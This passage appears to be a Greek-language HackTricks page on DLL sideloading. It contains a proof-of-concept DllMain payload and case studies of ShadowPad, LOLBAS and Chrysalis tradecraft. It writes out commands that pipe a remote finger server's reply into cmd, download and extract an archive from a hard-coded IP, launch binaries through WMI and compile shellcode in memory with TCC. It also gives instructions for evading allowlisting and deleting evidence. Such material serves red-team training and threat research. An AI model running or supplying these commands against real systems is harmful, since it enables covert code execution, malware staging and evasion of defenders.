BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για απαιτήσεις εξαγωγής, χρησιμοποιήστε ένα proxying framework (π.χ. DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που επίσης εκτελεί το payload σας.

- Αυτή η τεχνική βασίζεται στην επίλυση ονομάτων DLL από το host binary. Αν το host χρησιμοποιεί απόλυτες διαδρομές ή safe loading flags (π.χ. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- Τα KnownDLLs, SxS και forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να ληφθούν υπόψη κατά την επιλογή του host binary και του export set.

## Υπογεγραμμένες τριάδες + κρυπτογραφημένα payloads (ShadowPad case study)

Η Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας μια **τριάδα τριών αρχείων** για να συγχωνευτεί με νόμιμο λογισμικό ενώ διατηρεί τον κύριο payload κρυπτογραφημένο στο δίσκο:

1. **Signed host EXE** – vendor όπως AMD, Realtek ή NVIDIA καταχρώνται (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι επιτιθέμενοι μετονομάζουν το εκτελέσιμο για να μοιάζει με Windows binary (π.χ. `conhost.exe`), αλλά η Authenticode υπογραφή παραμένει έγκυρη.
2. **Malicious loader DLL** – τοποθετείται δίπλα στο EXE με αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Το DLL είναι συνήθως ένα MFC binary obfuscated με το ScatterBrain framework· ο μοναδικός του ρόλος είναι να εντοπίσει το encrypted blob, να το αποκρυπτογραφήσει και να φορτώσει reflectively το ShadowPad.
3. **Encrypted payload blob** – συχνά αποθηκεύεται ως `<name>.tmp` στον ίδιο φάκελο. Αφού γίνει memory-mapping του decrypted payload, ο loader διαγράφει το TMP αρχείο για να καταστρέψει τα αποδεικτικά στοιχεία διερεύνησης.

Σημειώσεις tradecraft:

* Η μετονομασία του signed EXE (διατηρώντας το αρχικό `OriginalFileName` στο PE header) του επιτρέπει να προσποιείται Windows binary ενώ διατηρεί την υπογραφή του vendor, οπότε αναπαράγετε τη συνήθεια του Ink Dragon να αφήνει binaries που μοιάζουν με `conhost.exe` αλλά στην πραγματικότητα είναι AMD/NVIDIA utilities.
* Εφόσον το εκτελέσιμο παραμένει αξιόπιστο, οι περισσότερες πολιτικές allowlisting απαιτούν μόνο το malicious DLL να βρίσκεται δίπλα του. Επικεντρωθείτε στην προσαρμογή του loader DLL· το signed parent συνήθως μπορεί να τρέξει χωρίς τροποποιήσεις.
* Ο decryptor του ShadowPad αναμένει το TMP blob δίπλα στον loader και να είναι εγγράψιμο ώστε να μπορεί να μηδενίσει το αρχείο μετά το mapping. Κρατήστε τον φάκελο εγγράψιμο μέχρι να φορτωθεί το payload· μόλις είναι στη μνήμη το TMP αρχείο μπορεί με ασφάλεια να διαγραφεί για OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Οι χειριστές συνδυάζουν DLL sideloading με LOLBAS ώστε το μόνο custom artifact στο δίσκο να είναι το malicious DLL δίπλα στο trusted EXE:

- **Remote command loader (Finger):** Ένα κρυφό PowerShell δημιουργεί `cmd.exe /c`, τραβάει εντολές από έναν Finger server και τις περνάει στο `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` τραβάει κείμενο TCP/79; `| cmd` εκτελεί την απάντηση του server, επιτρέποντας στους χειριστές να αλλάζουν τον δεύτερο στάδιο server-side.

- **Built-in download/extract:** Κατεβάστε ένα archive με benign extension, αποσυμπιέστε το και τοποθετήστε το sideload target μαζί με τη DLL σε έναν τυχαίο φάκελο `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` αποκρύπτει την πρόοδο και ακολουθεί redirects; `tar -xf` χρησιμοποιεί το ενσωματωμένο tar των Windows.

- **WMI/CIM launch:** Εκκινήστε το EXE μέσω WMI ώστε η τηλεμετρία να δείχνει μια διαδικασία δημιουργημένη από CIM ενώ φορτώνει τη colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Λειτουργεί με binaries που προτιμούν τοπικές DLLs (π.χ. `intelbq.exe`, `nearby_share.exe`); το payload (π.χ. Remcos) τρέχει με το trusted όνομα.

- **Hunting:** Ειδοποιήστε όταν εντοπίζεται `forfiles` και τα `/p`, `/m` και `/c` εμφανίζονται μαζί· ασυνήθιστο εκτός admin scripts.


## Μελέτη περίπτωσης: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Μια πρόσφατη intrusion του Lotus Blossom εκμεταλλεύτηκε μια αξιόπιστη αλυσίδα ενημερώσεων για να παραδώσει έναν NSIS-packed dropper που τοποθέτησε ένα DLL sideload καθώς και πλήρως in-memory payloads.

Ροή tradecraft
- Το `update.exe` (NSIS) δημιουργεί το `%AppData%\Bluetooth`, το σημειώνει ως **HIDDEN**, αφήνει ένα μετονομασμένο Bitdefender Submission Wizard `BluetoothService.exe`, ένα malicious `log.dll` και ένα encrypted blob `BluetoothService`, και στη συνέχεια εκκινεί το EXE.
- Το host EXE κάνει import το `log.dll` και καλεί `LogInit`/`LogWrite`. Το `LogInit` κάνει mmap-load του blob· το `LogWrite` το decrypts με ένα custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material παράγεται από ένα προηγούμενο hash), αντικαθιστά το buffer με plaintext shellcode, απελευθερώνει τα προσωρινά και κάνει jump σε αυτό.
- Για να αποφευχθεί ένα IAT, ο loader επιλύει τα APIs κάνοντας hashing των export names χρησιμοποιώντας **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, στη συνέχεια εφαρμόζει μια Murmur-style avalanche (**0x85EBCA6B**) και συγκρίνει με salted target hashes.

Κύριο shellcode (Chrysalis)
- Αποκρυπτογραφεί ένα PE-like κύριο module επαναλαμβάνοντας add/XOR/sub με το key `gQ2JR&9;` σε πέντε passes, μετά dynamically φορτώνει `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει την επίλυση imports.
- Ανασυνθέτει strings ονομάτων DLL κατά το runtime μέσω per-character bit-rotate/XOR transforms, και μετά φορτώνει `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί έναν δεύτερο resolver που διασχίζει την **PEB → InMemoryOrderModuleList**, parses κάθε export table σε blocks των 4-byte με Murmur-style mixing, και επιστρέφει σε `GetProcAddress` μόνο αν το hash δεν βρεθεί.

Ενσωματωμένη διαμόρφωση & C2
- Η διαμόρφωση βρίσκεται μέσα στο dropped `BluetoothService` αρχείο στη **θέση offset 0x30808** (μέγεθος **0x980**) και αποκρυπτογραφείται με RC4 με key `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
- Τα beacons κατασκευάζουν ένα dot-delimited host profile, προσθέτουν το tag `4Q` στην αρχή, και στη συνέχεια RC4-encrypt με key `vAuig34%^325hGV` πριν από την κλήση `HttpSendRequestA` πάνω από HTTPS. Οι απαντήσεις αποκρυπτογραφούνται με RC4 και διανέμονται μέσω ενός tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Το execution mode καθορίζεται από CLI args: χωρίς args = εγκαθιστά persistence (service/Run key) που δείχνει στο `-i`; το `-i` επανεκκινεί τον εαυτό του με `-k`; το `-k` παραλείπει την εγκατάσταση και τρέχει το payload.

Εναλλακτικός loader που παρατηρήθηκε
- Η ίδια intrusion άφησε το Tiny C Compiler και εκτέλεσε `svchost.exe -nostdlib -run conf.c` από το `C:\ProgramData\USOShared\`, με το `libtcc.dll` δίπλα του. Ο attacker-supplied C source ενσωμάτωσε shellcode, το compiled και το έτρεξε in-memory χωρίς να γράψει PE στο δίσκο. Αναπαράγετε με:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Αυτή η φάση compile-and-run βασισμένη στο TCC εισήγαγε το `Wininet.dll` κατά το runtime και κατέβασε ένα second-stage shellcode από ένα hardcoded URL, παρέχοντας έναν ευέλικτο loader που μεταμφιέζεται ως compiler run.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
